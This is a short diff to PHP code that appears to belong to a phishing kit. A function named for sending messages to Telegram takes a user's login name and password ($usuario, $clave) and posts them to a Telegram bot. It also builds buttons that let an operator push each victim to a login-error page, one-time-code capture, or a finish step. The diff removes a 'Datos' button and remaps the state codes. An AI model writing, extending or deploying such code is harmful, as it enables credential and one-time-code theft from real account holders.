@@ -71,18 +71,17 @@ function enviarMensajeTelegram($usuario, $clave, $config, $clienteId) {
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=1&key=$security_key"],
-                ['text' => 'Datos', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"]
+                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=1&key=$security_key"]
             ],
             [
-                ['text' => 'Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
-                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"]
+                ['text' => 'Otp', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
+                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"]
             ],
             [
                 ['text' => 'Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0&key=$security_key"]
             ]
         ]
-    ];
+    ]; 
 
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
